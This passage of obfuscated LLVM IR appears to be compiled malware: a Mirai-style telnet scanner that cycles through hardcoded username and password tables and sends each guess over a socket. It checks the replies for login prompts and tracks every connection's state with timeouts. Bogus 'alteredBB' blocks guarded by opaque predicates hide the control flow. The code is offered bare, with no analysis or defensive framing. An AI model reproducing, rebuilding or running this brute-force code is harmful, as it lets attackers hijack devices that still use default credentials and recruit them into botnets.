  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %611
  %620 = load i32, i32* %10, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %621
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %622, i32 0, i32 6
  store i32 0, i32* %623, align 4
  %624 = load i32, i32* %10, align 4
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %625
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %626, i32 0, i32 7
  store i16 0, i16* %627, align 16
  %628 = load i32, i32* %10, align 4
  %629 = sext i32 %628 to i64
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %629
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %630, i32 0, i32 8
  %632 = load i8*, i8** %631, align 8
  call void @llvm.memset.p0i8.i64(i8* %632, i8 0, i64 1024, i32 1, i1 false)
  %633 = load i32, i32* %10, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 2
  store i8 3, i8* %636, align 8
  %637 = load i32, i32* @x.67
  %638 = load i32, i32* @y.68
  %639 = sub i32 %637, 1
  %640 = mul i32 %637, %639
  %641 = urem i32 %640, 2
  %642 = icmp eq i32 %641, 0
  %643 = icmp slt i32 %638, 10
  %644 = or i1 %642, %643
  br i1 %644, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %1870

; <label>:645:                                    ; preds = %592
  %646 = load i32, i32* %10, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %647
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %648, i32 0, i32 8
  %650 = load i8*, i8** %649, align 8
  %651 = call i64 @strlen(i8* %650) #10
  %652 = trunc i64 %651 to i16
  %653 = load i32, i32* %10, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %654
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %655, i32 0, i32 7
  store i16 %652, i16* %656, align 16
  br label %657

; <label>:657:                                    ; preds = %645
  %658 = load i32, i32* %10, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %659
  %661 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %660, i32 0, i32 6
  %662 = load i32, i32* %661, align 4
  %663 = add i32 %662, 30
  %664 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %665 = icmp ult i32 %663, %664
  br i1 %665, label %666, label %681

; <label>:666:                                    ; preds = %657
  %667 = load i32, i32* %10, align 4
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %668
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %669, i32 0, i32 0
  %671 = load i32, i32* %670, align 16
  %672 = call i32 @sclose(i32 %671)
  %673 = load i32, i32* %10, align 4
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %674
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %675, i32 0, i32 2
  store i8 0, i8* %676, align 8
  %677 = load i32, i32* %10, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %678
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %679, i32 0, i32 3
  store i8 1, i8* %680, align 1
  br label %681

; <label>:681:                                    ; preds = %666, %657
  br label %1869

; <label>:682:                                    ; preds = %97
  %683 = load i32, i32* %10, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %684
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %685, i32 0, i32 0
  %687 = load i32, i32* %686, align 16
  %688 = load i32, i32* %10, align 4
  %689 = sext i32 %688 to i64
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %689
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %690, i32 0, i32 4
  %692 = load i8, i8* %691, align 2
  %693 = zext i8 %692 to i64
  %694 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %693
  %695 = load i8*, i8** %694, align 8
  %696 = load i32, i32* %10, align 4
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %697
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %698, i32 0, i32 4
  %700 = load i8, i8* %699, align 2
  %701 = zext i8 %700 to i64
  %702 = getelementptr inbounds [7 x i8*], [7 x i8*]* @usernames, i64 0, i64 %701
  %703 = load i8*, i8** %702, align 8
  %704 = call i64 @strlen(i8* %703) #10
  %705 = call i64 @send(i32 %687, i8* %695, i64 %704, i32 16384)
  %706 = icmp slt i64 %705, 0
  br i1 %706, label %707, label %722

; <label>:707:                                    ; preds = %682
  %708 = load i32, i32* %10, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 0
  %712 = load i32, i32* %711, align 16
  %713 = call i32 @sclose(i32 %712)
  %714 = load i32, i32* %10, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %716, i32 0, i32 2
  store i8 0, i8* %717, align 8
  %718 = load i32, i32* %10, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %719
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %720, i32 0, i32 3
  store i8 1, i8* %721, align 1
  br label %1870

; <label>:722:                                    ; preds = %682
  %723 = load i32, i32* %10, align 4
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %724
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %725, i32 0, i32 0
  %727 = load i32, i32* %726, align 16
  %728 = call i64 @send(i32 %727, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.27, i32 0, i32 0), i64 2, i32 16384)
  %729 = icmp slt i64 %728, 0
  br i1 %729, label %730, label %745

; <label>:730:                                    ; preds = %722
  %731 = load i32, i32* %10, align 4
  %732 = sext i32 %731 to i64
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %732
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %733, i32 0, i32 0
  %735 = load i32, i32* %734, align 16
  %736 = call i32 @sclose(i32 %735)
  %737 = load i32, i32* %10, align 4
  %738 = sext i32 %737 to i64
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %738
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %739, i32 0, i32 2
  store i8 0, i8* %740, align 8
  %741 = load i32, i32* %10, align 4
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %742
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %743, i32 0, i32 3
  store i8 1, i8* %744, align 1
  br label %1870

; <label>:745:                                    ; preds = %722
  %746 = load i32, i32* @x.67
  %747 = load i32, i32* @y.68
  %748 = sub i32 %746, 1
  %749 = mul i32 %746, %748
  %750 = urem i32 %749, 2
  %751 = icmp eq i32 %750, 0
  %752 = icmp slt i32 %747, 10
  %753 = or i1 %751, %752
  br i1 %753, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %745
  %754 = load i32, i32* %10, align 4
  %755 = sext i32 %754 to i64
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %755
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %756, i32 0, i32 2
  store i8 4, i8* %757, align 8
  %758 = load i32, i32* @x.67
  %759 = load i32, i32* @y.68
  %760 = sub i32 %758, 1
  %761 = mul i32 %758, %760
  %762 = urem i32 %761, 2
  %763 = icmp eq i32 %762, 0
  %764 = icmp slt i32 %759, 10
  %765 = or i1 %763, %764
  br i1 %765, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %1869

; <label>:766:                                    ; preds = %97
  %767 = load i32, i32* @x.67
  %768 = load i32, i32* @y.68
  %769 = sub i32 %767, 1
  %770 = mul i32 %767, %769
  %771 = urem i32 %770, 2
  %772 = icmp eq i32 %771, 0
  %773 = icmp slt i32 %768, 10
  %774 = or i1 %772, %773
  br i1 %774, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %766
  %775 = load i32, i32* %10, align 4
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %776
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %777, i32 0, i32 6
  %779 = load i32, i32* %778, align 4
  %780 = icmp eq i32 %779, 0
  %781 = load i32, i32* @x.67
  %782 = load i32, i32* @y.68
  %783 = sub i32 %781, 1
  %784 = mul i32 %781, %783
  %785 = urem i32 %784, 2
  %786 = icmp eq i32 %785, 0
  %787 = icmp slt i32 %782, 10
  %788 = or i1 %786, %787
  br i1 %788, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %780, label %789, label %795

; <label>:789:                                    ; preds = %originalBBpart284
  %790 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %791 = load i32, i32* %10, align 4
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 6
  store i32 %790, i32* %794, align 4
  br label %795

; <label>:795:                                    ; preds = %789, %originalBBpart284
  %796 = load i32, i32* @x.67
  %797 = load i32, i32* @y.68
  %798 = sub i32 %796, 1
  %799 = mul i32 %796, %798
  %800 = urem i32 %799, 2
  %801 = icmp eq i32 %800, 0
  %802 = icmp slt i32 %797, 10
  %803 = or i1 %801, %802
  br i1 %803, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %795
  %804 = load i32, i32* %10, align 4
  %805 = sext i32 %804 to i64
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %805
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %806, i32 0, i32 0
  %808 = load i32, i32* %807, align 16
  %809 = load i32, i32* %10, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %810
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %811, i32 0, i32 8
  %813 = load i8*, i8** %812, align 8
  %814 = load i32, i32* %10, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %816, i32 0, i32 7
  %818 = load i16, i16* %817, align 16
  %819 = zext i16 %818 to i32
  %820 = call i32 @readUntil(i32 %808, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %813, i32 1024, i32 %819)
  %821 = icmp ne i32 %820, 0
  %822 = load i32, i32* @x.67
  %823 = load i32, i32* @y.68
  %824 = sub i32 %822, 1
  %825 = mul i32 %822, %824
  %826 = urem i32 %825, 2
  %827 = icmp eq i32 %826, 0
  %828 = icmp slt i32 %823, 10
  %829 = or i1 %827, %828
  br i1 %829, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %821, label %830, label %894

; <label>:830:                                    ; preds = %originalBBpart288
  %831 = load i32, i32* @x.67
  %832 = load i32, i32* @y.68
  %833 = sub i32 %831, 1
  %834 = mul i32 %831, %833
  %835 = urem i32 %834, 2
  %836 = icmp eq i32 %835, 0
  %837 = icmp slt i32 %832, 10
  %838 = or i1 %836, %837
  br i1 %838, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %830
  %839 = load i32, i32* %10, align 4
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %840
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %841, i32 0, i32 6
  store i32 0, i32* %842, align 4
  %843 = load i32, i32* %10, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %844
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %845, i32 0, i32 7
  store i16 0, i16* %846, align 16
  %847 = load i32, i32* %10, align 4
  %848 = sext i32 %847 to i64
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %848
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %849, i32 0, i32 8
  %851 = load i8*, i8** %850, align 8
  %852 = call i8* @strstr(i8* %851, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.28, i32 0, i32 0)) #10
  %853 = icmp ne i8* %852, null
  %854 = load i32, i32* @x.67
  %855 = load i32, i32* @y.68
  %856 = sub i32 %854, 1
  %857 = mul i32 %854, %856
  %858 = urem i32 %857, 2
  %859 = icmp eq i32 %858, 0
  %860 = icmp slt i32 %855, 10
  %861 = or i1 %859, %860
  br i1 %861, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %853, label %862, label %867

; <label>:862:                                    ; preds = %originalBBpart292
  %863 = load i32, i32* %10, align 4
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %864
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %865, i32 0, i32 2
  store i8 5, i8* %866, align 8
  br label %888

; <label>:867:                                    ; preds = %originalBBpart292
  %868 = load i32, i32* @x.67
  %869 = load i32, i32* @y.68
  %870 = sub i32 %868, 1
  %871 = mul i32 %868, %870
  %872 = urem i32 %871, 2
  %873 = icmp eq i32 %872, 0
  %874 = icmp slt i32 %869, 10
  %875 = or i1 %873, %874
  br i1 %875, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %867
  %876 = load i32, i32* %10, align 4
  %877 = sext i32 %876 to i64
  %878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %877
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %878, i32 0, i32 2
  store i8 100, i8* %879, align 8
  %880 = load i32, i32* @x.67
  %881 = load i32, i32* @y.68
  %882 = sub i32 %880, 1
  %883 = mul i32 %880, %882
  %884 = urem i32 %883, 2
  %885 = icmp eq i32 %884, 0
  %886 = icmp slt i32 %881, 10
  %887 = or i1 %885, %886
  br i1 %887, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %888

; <label>:888:                                    ; preds = %originalBBpart296, %862
  %889 = load i32, i32* %10, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %890
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %891, i32 0, i32 8
  %893 = load i8*, i8** %892, align 8
  call void @llvm.memset.p0i8.i64(i8* %893, i8 0, i64 1024, i32 1, i1 false)
  br label %1870

; <label>:894:                                    ; preds = %originalBBpart288
  %895 = load i32, i32* @x.67
  %896 = load i32, i32* @y.68
  %897 = sub i32 %895, 1
  %898 = mul i32 %895, %897
  %899 = urem i32 %898, 2
  %900 = icmp eq i32 %899, 0
  %901 = icmp slt i32 %896, 10
  %902 = or i1 %900, %901
  br i1 %902, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %894
  %903 = load i32, i32* %10, align 4
  %904 = sext i32 %903 to i64
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %904
  %906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %905, i32 0, i32 8
  %907 = load i8*, i8** %906, align 8
  %908 = call i8* @strstr(i8* %907, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.29, i32 0, i32 0)) #10
  %909 = icmp ne i8* %908, null
  %910 = load i32, i32* @x.67
  %911 = load i32, i32* @y.68
  %912 = sub i32 %910, 1
  %913 = mul i32 %910, %912
  %914 = urem i32 %913, 2
  %915 = icmp eq i32 %914, 0
  %916 = icmp slt i32 %911, 10
  %917 = or i1 %915, %916
  br i1 %917, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %909, label %918, label %933

; <label>:918:                                    ; preds = %originalBBpart2100
  %919 = load i32, i32* %10, align 4
  %920 = sext i32 %919 to i64
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %920
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %921, i32 0, i32 0
  %923 = load i32, i32* %922, align 16
  %924 = call i32 @sclose(i32 %923)
  %925 = load i32, i32* %10, align 4
  %926 = sext i32 %925 to i64
  %927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %926
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %927, i32 0, i32 2
  store i8 0, i8* %928, align 8
  %929 = load i32, i32* %10, align 4
  %930 = sext i32 %929 to i64
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %930
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %931, i32 0, i32 3
  store i8 0, i8* %932, align 1
  br label %1870

; <label>:933:                                    ; preds = %originalBBpart2100
  %934 = load i32, i32* @x.67
  %935 = load i32, i32* @y.68
  %936 = sub i32 %934, 1
  %937 = mul i32 %934, %936
  %938 = urem i32 %937, 2
  %939 = icmp eq i32 %938, 0
  %940 = icmp slt i32 %935, 10
  %941 = or i1 %939, %940
  br i1 %941, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %933
  %942 = load i32, i32* %10, align 4
  %943 = sext i32 %942 to i64
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %943
  %945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %944, i32 0, i32 8
  %946 = load i8*, i8** %945, align 8
  %947 = call i64 @strlen(i8* %946) #10
  %948 = trunc i64 %947 to i16
  %949 = load i32, i32* %10, align 4
  %950 = sext i32 %949 to i64
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %950
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %951, i32 0, i32 7
  store i16 %948, i16* %952, align 16
  %953 = load i32, i32* @x.67
  %954 = load i32, i32* @y.68
  %955 = sub i32 %953, 1
  %956 = mul i32 %953, %955
  %957 = urem i32 %956, 2
  %958 = icmp eq i32 %957, 0
  %959 = icmp slt i32 %954, 10
  %960 = or i1 %958, %959
  br i1 %960, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %961

; <label>:961:                                    ; preds = %originalBBpart2104
  %962 = load i32, i32* %10, align 4
  %963 = sext i32 %962 to i64
  %964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %963
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %964, i32 0, i32 6
  %966 = load i32, i32* %965, align 4
  %967 = add i32 %966, 30
  %968 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %969 = icmp ult i32 %967, %968
  br i1 %969, label %970, label %985

; <label>:970:                                    ; preds = %961
  %971 = load i32, i32* %10, align 4
  %972 = sext i32 %971 to i64
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %972
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %973, i32 0, i32 0
  %975 = load i32, i32* %974, align 16
  %976 = call i32 @sclose(i32 %975)
  %977 = load i32, i32* %10, align 4
  %978 = sext i32 %977 to i64
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %978
  %980 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %979, i32 0, i32 2
  store i8 0, i8* %980, align 8
  %981 = load i32, i32* %10, align 4
  %982 = sext i32 %981 to i64
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %982
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %983, i32 0, i32 3
  store i8 1, i8* %984, align 1
  br label %985

; <label>:985:                                    ; preds = %970, %961
  %986 = load i32, i32* @x.67
  %987 = load i32, i32* @y.68
  %988 = sub i32 %986, 1
  %989 = mul i32 %986, %988
  %990 = urem i32 %989, 2
  %991 = icmp eq i32 %990, 0
  %992 = icmp slt i32 %987, 10
  %993 = or i1 %991, %992
  br i1 %993, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %985
  %994 = load i32, i32* @x.67
  %995 = load i32, i32* @y.68
  %996 = sub i32 %994, 1
  %997 = mul i32 %994, %996
  %998 = urem i32 %997, 2
  %999 = icmp eq i32 %998, 0
  %1000 = icmp slt i32 %995, 10
  %1001 = or i1 %999, %1000
  br i1 %1001, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br label %1869

; <label>:1002:                                   ; preds = %97
  %1003 = load i32, i32* @x.67
  %1004 = load i32, i32* @y.68
  %1005 = sub i32 %1003, 1
  %1006 = mul i32 %1003, %1005
  %1007 = urem i32 %1006, 2
  %1008 = icmp eq i32 %1007, 0
  %1009 = icmp slt i32 %1004, 10
  %1010 = or i1 %1008, %1009
  br i1 %1010, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %1002
  %1011 = load i32, i32* %10, align 4
  %1012 = sext i32 %1011 to i64
  %1013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1012
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1013, i32 0, i32 0
  %1015 = load i32, i32* %1014, align 16
  %1016 = load i32, i32* %10, align 4
  %1017 = sext i32 %1016 to i64
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1017
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1018, i32 0, i32 5
  %1020 = load i8, i8* %1019, align 1
  %1021 = zext i8 %1020 to i64
  %1022 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1021
  %1023 = load i8*, i8** %1022, align 8
  %1024 = load i32, i32* %10, align 4
  %1025 = sext i32 %1024 to i64
  %1026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1025
  %1027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1026, i32 0, i32 5
  %1028 = load i8, i8* %1027, align 1
  %1029 = zext i8 %1028 to i64
  %1030 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %1029
  %1031 = load i8*, i8** %1030, align 8
  %1032 = call i64 @strlen(i8* %1031) #10
  %1033 = call i64 @send(i32 %1015, i8* %1023, i64 %1032, i32 16384)
  %1034 = icmp slt i64 %1033, 0
  %1035 = load i32, i32* @x.67
  %1036 = load i32, i32* @y.68
  %1037 = sub i32 %1035, 1
  %1038 = mul i32 %1035, %1037
  %1039 = urem i32 %1038, 2
  %1040 = icmp eq i32 %1039, 0
  %1041 = icmp slt i32 %1036, 10
  %1042 = or i1 %1040, %1041
  br i1 %1042, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %1034, label %1043, label %1074

; <label>:1043:                                   ; preds = %originalBBpart2112
  %1044 = load i32, i32* @x.67
  %1045 = load i32, i32* @y.68
  %1046 = sub i32 %1044, 1
  %1047 = mul i32 %1044, %1046
  %1048 = urem i32 %1047, 2
  %1049 = icmp eq i32 %1048, 0
  %1050 = icmp slt i32 %1045, 10
  %1051 = or i1 %1049, %1050
  br i1 %1051, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %1043
  %1052 = load i32, i32* %10, align 4
  %1053 = sext i32 %1052 to i64
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1053
  %1055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1054, i32 0, i32 0
  %1056 = load i32, i32* %1055, align 16
  %1057 = call i32 @sclose(i32 %1056)
  %1058 = load i32, i32* %10, align 4
  %1059 = sext i32 %1058 to i64
  %1060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1059
  %1061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1060, i32 0, i32 2
  store i8 0, i8* %1061, align 8
  %1062 = load i32, i32* %10, align 4
  %1063 = sext i32 %1062 to i64
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1063
  %1065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1064, i32 0, i32 3
  store i8 1, i8* %1065, align 1
  %1066 = load i32, i32* @x.67
  %1067 = load i32, i32* @y.68
  %1068 = sub i32 %1066, 1
  %1069 = mul i32 %1066, %1068
  %1070 = urem i32 %1069, 2
  %1071 = icmp eq i32 %1070, 0
  %1072 = icmp slt i32 %1067, 10
  %1073 = or i1 %1071, %1072
  br i1 %1073, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br label %1870

; <label>:1074:                                   ; preds = %originalBBpart2112
  %1075 = load i32, i32* %10, align 4
  %1076 = sext i32 %1075 to i64
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1076
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1077, i32 0, i32 0
  %1079 = load i32, i32* %1078, align 16
  %1080 = call i64 @send(i32 %1079, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.27, i32 0, i32 0), i64 2, i32 16384)
  %1081 = icmp slt i64 %1080, 0
  br i1 %1081, label %1082, label %1113

; <label>:1082:                                   ; preds = %1074
  %1083 = load i32, i32* @x.67
  %1084 = load i32, i32* @y.68
  %1085 = sub i32 %1083, 1
  %1086 = mul i32 %1083, %1085
  %1087 = urem i32 %1086, 2
  %1088 = icmp eq i32 %1087, 0
  %1089 = icmp slt i32 %1084, 10
  %1090 = or i1 %1088, %1089
  br i1 %1090, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %1082
  %1091 = load i32, i32* %10, align 4
  %1092 = sext i32 %1091 to i64
  %1093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1092
  %1094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1093, i32 0, i32 0
  %1095 = load i32, i32* %1094, align 16
  %1096 = call i32 @sclose(i32 %1095)
  %1097 = load i32, i32* %10, align 4
  %1098 = sext i32 %1097 to i64
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1098
  %1100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1099, i32 0, i32 2
  store i8 0, i8* %1100, align 8
  %1101 = load i32, i32* %10, align 4
  %1102 = sext i32 %1101 to i64
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1102
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1103, i32 0, i32 3
  store i8 1, i8* %1104, align 1
  %1105 = load i32, i32* @x.67
  %1106 = load i32, i32* @y.68
  %1107 = sub i32 %1105, 1
  %1108 = mul i32 %1105, %1107
  %1109 = urem i32 %1108, 2
  %1110 = icmp eq i32 %1109, 0
  %1111 = icmp slt i32 %1106, 10
  %1112 = or i1 %1110, %1111
  br i1 %1112, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %1870

; <label>:1113:                                   ; preds = %1074
  %1114 = load i32, i32* %10, align 4
  %1115 = sext i32 %1114 to i64
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1115
  %1117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1116, i32 0, i32 2
  store i8 6, i8* %1117, align 8
  br label %1869

; <label>:1118:                                   ; preds = %97
  %1119 = load i32, i32* %10, align 4
  %1120 = sext i32 %1119 to i64
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 %1120
  %1122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1121, i32 0, i32 6
  %1123 = load i32, i32* %1122, align 4
  %1124 = icmp eq i32 %1123, 0
  br i1 %1124, label %1125, label %1147

